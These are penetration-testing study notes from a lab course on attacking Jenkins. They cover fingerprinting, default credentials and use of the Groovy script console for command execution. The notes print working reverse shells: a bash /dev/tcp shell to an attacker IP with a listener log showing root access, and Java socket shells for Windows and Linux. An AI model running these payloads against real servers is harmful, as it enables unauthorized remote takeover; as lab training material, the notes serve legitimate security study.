---
title: "Jenkins"
category: ["PREP_CPTS", "Pen-testing", "Attack Common apps", "Servlet containers", "Jenkins"]
---

## Discovery/Footprinting

Let's assume we are working on an internal penetration test and have completed our web discovery scans. We notice what we believe is a Jenkins instance and know it is often installed on Windows servers running as the all-powerful SYSTEM account. If we can gain access via Jenkins and gain remote code execution as the SYSTEM account, we would have a foothold in Active Directory to begin enumeration of the domain environment.

Jenkins runs on Tomcat port 8080 by default. It also utilizes port 5000 to attach slave servers. This port is used to communicate between masters and slaves. Jenkins can use a local database, LDAP, Unix user database, delegate security to a servlet container, or use no authentication at all. Administrators can also allow or disallow users from creating accounts.

---
## Enumeration

http://jenkins.inlanefreight.local:8000/configureSecurity/
![Jenkins Configure Global Security page showing authentication and security realm options, with 'Jenkins’ own user database' and 'Logged-in users can do anything' selected.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/jenkins_global_security.png)

The default installation typically uses Jenkins’ database to store credentials and does not allow users to register an account. We can fingerprint Jenkins quickly by the telltale login page.

http://jenkins.inlanefreight.local:8000/login?from=%2F
![Jenkins login page with fields for username and password, and 'Keep me signed in' option.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/jenkins_login.png)
We may encounter a Jenkins instance that uses weak or default credentials such as `admin:admin` or does not have any type of authentication enabled. It is not uncommon to find Jenkins instances that do not require any authentication during an internal penetration test. While rare, we have come across Jenkins during external penetration tests that we were able to attack.

# Attacking 
## Script Console

The script console can be reached at the URL `http://jenkins.inlanefreight.local:8000/script`. This console allows a user to run Apache [Groovy](https://en.wikipedia.org/wiki/Apache_Groovy) scripts, which are an object-oriented Java-compatible language. The language is similar to Python and Ruby. Groovy source code gets compiled into Java Bytecode and can run on any platform that has JRE installed.

Using this script console, it is possible to run arbitrary commands, functioning similarly to a web shell. For example, we can use the following snippet to run the `id` command.

 ```
 def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
 ```

http://jenkins.inlanefreight.local:8000/script

![Jenkins Script Console with Groovy script to execute 'id' command, showing result as 'uid=0(root) gid=0(root)'.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/groovy_web.png)

There are various ways that access to the script console can be leveraged to gain a reverse shell. For example, using the command below, or [this](https://web.archive.org/web/20230326230234/https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console/) Metasploit module.

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

Running the above commands results in a reverse shell connection.

```
nc -lvnp 8443

listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 57844

id

uid=0(root) gid=0(root) groups=0(root)

/bin/bash -i

root@app02:/var/lib/jenkins3#
```

Against a Windows host, we could attempt to add a user and connect to the host via RDP or WinRM or, to avoid making a change to the system, use a PowerShell download cradle with [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). We could run commands on a Windows-based Jenkins install using this snippet:

```
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

We could also use [this](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy) Java reverse shell to gain command execution on a Windows host, swapping out `localhost` and the port for our IP address and listener port.

```
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

We gained control of the system via : /script 
https://cloud.hacktricks.wiki/en/pentesting-ci-cd/jenkins-security/jenkins-rce-with-groovy-script.html

String host="myip";
int port=1234;
String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

https://github.com/gquere/pwn_jenkins/tree/master

